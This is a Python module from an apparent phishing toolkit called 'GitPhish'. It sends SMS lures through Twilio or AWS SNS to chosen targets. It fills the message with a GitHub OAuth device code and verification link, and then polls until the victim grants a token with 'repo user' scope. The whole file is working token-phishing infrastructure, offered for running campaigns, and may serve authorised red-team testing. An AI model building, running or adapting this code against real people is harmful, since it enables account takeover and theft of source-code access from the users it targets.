"""
SMS delivery module for GitPhish campaigns.
"""

import logging
import os
import json
import glob
import boto3
from twilio.rest import Client

def setup_sms_campaigns_subparser(parent_parser):
    """Setup SMS campaigns subparser."""
    sms_parser = parent_parser.add_parser('sms', help='SMS delivery for phishing campaigns')
    sms_subparsers = sms_parser.add_subparsers(dest='sms_command', help='SMS delivery providers')
    
    # Twilio SMS delivery
    twilio_parser = sms_subparsers.add_parser('twilio', help='Send SMS via Twilio')
    twilio_parser.add_argument('-e', '--email', required=True, help='Target email address')
    twilio_parser.add_argument('-p', '--phone', required=True, help='Target phone number')
    twilio_parser.add_argument('--sid', required=True, help='Twilio Account SID')
    twilio_parser.add_argument('--token', required=True, help='Twilio Auth Token')
    twilio_parser.add_argument('--from-phone', required=True, help='Twilio phone number')
    twilio_parser.add_argument('--message', required=True, help='SMS message template')
    twilio_parser.add_argument('--client-id', help='OAuth app client ID')
    twilio_parser.add_argument('--org-name', help='Target organization name') 
    twilio_parser.add_argument('--scope', default='repo user', help='OAuth scopes for token requests')
    twilio_parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    twilio_parser.add_argument('--poll-tokens', action='store_true', help='Poll for OAuth token completion after sending SMS')
    twilio_parser.set_defaults(func=send_twilio_campaign)
    
    # AWS SNS SMS delivery
    aws_parser = sms_subparsers.add_parser('aws', help='Send SMS via AWS SNS')
    aws_parser.add_argument('-e', '--email', required=True, help='Target email address')
    aws_parser.add_argument('-p', '--phone', required=True, help='Target phone number')
    aws_parser.add_argument('--region', default='us-east-2', help='AWS region')
    aws_parser.add_argument('--message', required=True, help='SMS message template')
    aws_parser.add_argument('--client-id', help='OAuth app client ID')
    aws_parser.add_argument('--org-name', help='Target organization name')
    aws_parser.add_argument('--scope', default='repo user', help='OAuth scopes for token requests')
    aws_parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    aws_parser.add_argument('--poll-tokens', action='store_true', help='Poll for OAuth token completion after sending SMS')
    aws_parser.set_defaults(func=send_aws_campaign)
    
    return sms_parser


def send_twilio_sms(phone, message, sid, token, from_phone, email=None):
    """Send SMS via Twilio."""
    try:
        client = Client(sid, token)
        client.messages.create(
            to=phone, 
            from_=from_phone, 
            body=message
        )
        logging.info(f"SMS sent successfully via Twilio to {phone}")
        return True
    except Exception as e:
        logging.error(f"Failed to send SMS via Twilio to {phone}: {e}")
        return False

def send_aws_sms(phone, message, region='us-east-2', email=None):
    """Send SMS via AWS SNS."""
    try:
        # Try to use explicit credentials from environment first, then fall back to default
        aws_access_key_id = os.getenv('AWS_ACCESS_KEY_ID')
        aws_secret_access_key = os.getenv('AWS_SECRET_ACCESS_KEY')
        aws_session_token = os.getenv('AWS_SESSION_TOKEN')
        
        if aws_access_key_id and aws_secret_access_key:
            # Use explicit credentials passed via environment
            logging.info(f"Using AWS credentials from environment variables")
            logging.info(f"Access Key ID: {aws_access_key_id}")
            logging.info(f"Secret Key: {'***' + aws_secret_access_key[-4:] if len(aws_secret_access_key) > 4 else '***'}")
            logging.info(f"Session Token: {'Yes' if aws_session_token else 'No'}")
            client_kwargs = {
                'region_name': region,
                'aws_access_key_id': aws_access_key_id,
                'aws_secret_access_key': aws_secret_access_key
            }
            if aws_session_token:
                client_kwargs['aws_session_token'] = aws_session_token
            sns_client = boto3.client('sns', **client_kwargs)
        else:
            # Fall back to default credential chain
            logging.info("Using AWS default credential chain")
            sns_client = boto3.client('sns', region_name=region)
            
        response = sns_client.publish(
            PhoneNumber=phone,
            Message=message,
            MessageAttributes={
                'AWS.SNS.SMS.SenderID': {
                    'DataType': 'String',
                    'StringValue': 'GitPhish'
                },
                'AWS.SNS.SMS.SMSType': {
                    'DataType': 'String',
                    'StringValue': 'Transactional'
                }
            }
        )
        logging.info(f"SMS sent successfully via AWS SNS to {phone}: {response['MessageId']}")
        return True
    except Exception as e:
        logging.error(f"Failed to send SMS via AWS SNS to {phone}: {e}")
        return False


def send_twilio_campaign(args):
    """Send SMS via Twilio with optional OAuth integration."""
    if args.debug:
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')
    
    message = args.message
    
    # Check if OAuth integration is needed based on template variables
    if '{verification_uri}' in message or '{user_code}' in message or '{email}' in message:
        # Validate OAuth requirements
        if not args.client_id or not args.org_name:
            logging.error("❌ OAuth integration requires --client-id and --org-name arguments")
            return 1
            
        logging.info("🔐 OAuth integration detected in message template")
        # Use existing manual OAuth flow and integrate with SMS
        from gitphish.core.manual.manual import ManualDeviceAuth
        
        oauth_handler = ManualDeviceAuth()
        try:
            # Always skip wait for SMS - we need device codes immediately to send SMS
            # The polling happens after SMS is sent if --poll-tokens is specified
            device_flow = oauth_handler.run_manual_device_code_flow(
                client_id=args.client_id,
                org_name=args.org_name, 
                email=args.email,
                skip_wait=True  # Always skip wait to get device codes for SMS
            )
            
            if isinstance(device_flow, dict) and 'user_code' in device_flow:
                logging.info("📱 OAuth flow initiated - replacing template variables")
                # Replace template variables with real values
                message = message.replace('{email}', args.email or '')
                message = message.replace('{user_code}', device_flow.get('user_code', ''))
                message = message.replace('{verification_uri}', device_flow.get('verification_uri', 'https://github.com/login/device'))
                message = message.replace('{device_code}', device_flow.get('device_code', ''))
                
                # Token will be saved automatically by ManualDeviceAuth when OAuth completes
            else:
                logging.error("❌ Failed to get device flow data")
                
        except Exception as e:
            logging.error(f"❌ OAuth flow failed: {e}")
            
    # Send SMS with processed message
    logging.info("📱 Sending SMS via Twilio")
    success = send_twilio_sms(
        phone=args.phone,
        message=message, 
        sid=args.sid, 
        token=args.token, 
        from_phone=args.from_phone,
        email=args.email
    )
    
    if not success:
        logging.error("❌ Failed to send SMS")
        return 1
        
    logging.info("✅ SMS sent successfully")
    
    # If poll_tokens is enabled, now poll for OAuth completion after SMS is sent
    if getattr(args, 'poll_tokens', False) and '{verification_uri}' in args.message:
        logging.info("🔄 Polling for OAuth token completion...")
        try:
            oauth_handler = ManualDeviceAuth()
            
            # Use the device_code from the OAuth flow we just ran
            if isinstance(device_flow, dict) and 'device_code' in device_flow:
                device_code = device_flow.get('device_code')
                # Poll for completion
                success = oauth_handler.poll_for_token_only(
                    client_id=args.client_id,
                    org_name=args.org_name,
                    device_code=device_code,
                    email=args.email
                )
                if success:
                    logging.info("🎉 OAuth token completed!")
                else:
                    logging.info("⏰ OAuth token polling timed out - this is normal")
        except Exception as e:
            logging.error(f"Error during token polling: {e}")
    
    return 0

def send_aws_campaign(args):
    """Send SMS via AWS SNS with optional OAuth integration."""
    if args.debug:
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')
    
    message = args.message
    
    # Check if OAuth integration is needed based on template variables
    if '{verification_uri}' in message or '{user_code}' in message or '{email}' in message:
        # Validate OAuth requirements
        if not args.client_id or not args.org_name:
            logging.error("❌ OAuth integration requires --client-id and --org-name arguments")
            return 1
            
        logging.info("🔐 OAuth integration detected in message template")
        # Use existing manual OAuth flow and integrate with SMS
        from gitphish.core.manual.manual import ManualDeviceAuth
        
        oauth_handler = ManualDeviceAuth()
        try:
            # Always skip wait for SMS - we need device codes immediately to send SMS
            # The polling happens after SMS is sent if --poll-tokens is specified
            device_flow = oauth_handler.run_manual_device_code_flow(
                client_id=args.client_id,
                org_name=args.org_name,
                email=args.email, 
                skip_wait=True  # Always skip wait to get device codes for SMS
            )
            
            if isinstance(device_flow, dict) and 'user_code' in device_flow:
                logging.info("📱 OAuth flow initiated - replacing template variables")
                # Replace template variables with real values
                message = message.replace('{email}', args.email or '')
                message = message.replace('{user_code}', device_flow.get('user_code', ''))
                message = message.replace('{verification_uri}', device_flow.get('verification_uri', 'https://github.com/login/device'))
                message = message.replace('{device_code}', device_flow.get('device_code', ''))
                
                # Token will be saved automatically by ManualDeviceAuth when OAuth completes
            else:
                logging.error("❌ Failed to get device flow data")
                
        except Exception as e:
            logging.error(f"❌ OAuth flow failed: {e}")
            
    # Send SMS with processed message
    logging.info("📱 Sending SMS via AWS SNS")
    success = send_aws_sms(
        phone=args.phone,
        message=message, 
        region=args.region,
        email=args.email
    )
    
    if not success:
        logging.error("❌ Failed to send SMS")
        return 1
        
    logging.info("✅ SMS sent successfully")
    
    # If poll_tokens is enabled, now poll for OAuth completion after SMS is sent
    if getattr(args, 'poll_tokens', False) and '{verification_uri}' in args.message:
        logging.info("🔄 Polling for OAuth token completion...")
        try:
            oauth_handler = ManualDeviceAuth()
            
            # Use the device_code from the OAuth flow we just ran
            if isinstance(device_flow, dict) and 'device_code' in device_flow:
                device_code = device_flow.get('device_code')
                # Poll for completion
                success = oauth_handler.poll_for_token_only(
                    client_id=args.client_id,
                    org_name=args.org_name,
                    device_code=device_code,
                    email=args.email
                )
                if success:
                    logging.info("🎉 OAuth token completed!")
                else:
                    logging.info("⏰ OAuth token polling timed out - this is normal")
        except Exception as e:
            logging.error(f"Error during token polling: {e}")
    
    return 0